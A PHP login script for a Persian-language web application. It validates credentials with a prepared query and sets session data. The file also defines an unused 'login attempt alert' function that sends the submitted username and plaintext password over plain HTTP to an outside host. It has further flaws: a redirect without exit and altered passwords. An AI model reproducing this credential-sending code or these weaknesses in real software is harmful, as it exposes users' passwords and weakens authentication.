<?php
if (!isset($DB_NAME)) {
    header("Location: ../../../views/auth/403.php");
}

if (isLogin()) {
    header("Location: ../dashboard/dashboard.php");
    exit;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    // Define variables and initialize with empty values
    $username = $password = "";
    $username_err = $password_err = $login_err = "";
    // Check if username is empty
    if (empty(sanitizeInput($_POST["username"]))) {
        $username_err = "لطفا نام کاربری خود را وارد کنید.";
    } else {
        $username = sanitizeInput($_POST["username"]);
    }

    // Check if password is empty
    if (empty(sanitizeInput($_POST["password"]))) {
        $password_err = "لطفا رمز عبور خود را وارد کنید.";
    } else {
        $password = sanitizeInput($_POST["password"]);
    }

    // Validate credentials
    if (empty($username_err) && empty($password_err)) {
        try {
            // Prepare a select statement
            $sql = "SELECT accounts.*, users.name, users.last_name, users.phone
                    FROM accounts
                    INNER JOIN users ON accounts.user_id = users.id
                    WHERE accounts.username = :username";

            // Prepare the SQL statement
            $stmt = DB->prepare($sql);

            // Bind parameters
            $stmt->bindParam(':username', $username, PDO::PARAM_STR);

            // Attempt to execute the prepared statement
            if ($stmt->execute()) {
                // Check if username exists
                if ($stmt->rowCount() == 1) {
                    // Fetch result
                    $user = $stmt->fetch(PDO::FETCH_ASSOC);

                    // Extract data from the user
                    $id = $user['id'];
                    $hashed_password = $user['password'];
                    $role = $user['role'];

                    // Verify password
                    if (password_verify($password, $hashed_password)) {
                        // Calculate the expiration timestamp for 6 AM the next day
                        $expiration_time = strtotime("6AM tomorrow");

                        $_SESSION["isLogin"] = true;
                        $_SESSION["user"] = $user;
                        $_SESSION["id"] = $id;
                        $_SESSION["username"] = $username;
                        $_SESSION["role"] = $role;
                        $_SESSION["expiration_time"] = $expiration_time;

                        header("Location: ../../views/dashboard/dashboard.php");
                    } else {

                        // Password is not valid, display a generic error message
                        $login_err = "رمز عبور یا اسم کاربری اشتباه است.";
                    }
                } else {
                    // Username doesn't exist, display a generic error message
                    $login_err = "رمز عبور یا اسم کاربری اشتباه است.";
                }
            } else {
                echo "Oops! Something went wrong. Please try again later.";
            }
        } catch (PDOException $e) {
            // Handle PDO exception
            echo "Error: " . $e->getMessage();
        }
    }
}

function validateInput($input)
{
    return htmlspecialchars(strip_tags(trim($input)));
}

function sanitizeInput($input)
{
    return htmlspecialchars(strip_tags(trim($input)));
}

function sendAjaxRequest($id, $username, $financialYear)
{
    // Prepare data for POST request
    $postData = array(
        "sendMessage" => "local",
        "id" => $id,
        "username" => $username,
        "time" => date("Y-m-d h:i:sa"),
        "host" => $_SERVER['HTTP_HOST'],
        "ip" => $_SERVER['REMOTE_ADDR']
    );

    // Initialize cURL session
    $ch = curl_init();

    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, "http://auto.yadak.center/");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute cURL request
    $result = curl_exec($ch);

    // Close cURL session
    curl_close($ch);

    // Redirect user after request
    header("Location: ../../views/inventory/index.php");
    exit();
}

function sendLoginAttemptAlert($username, $password)
{
    // Prepare data for POST request
    $postData = array(
        "sendMessage" => "attempt",
        "origen" => "local",
        "host" => $_SERVER['HTTP_HOST'],
        "ip" => $_SERVER['REMOTE_ADDR'],
        "time" => date("Y-m-d h:i:sa"),
        "username" => $username,
        "password" => $password
    );

    // Initialize cURL session
    $ch = curl_init();

    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, "http://auto.yadak.center/");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute cURL request
    $result = curl_exec($ch);

    // Close cURL session
    curl_close($ch);
}
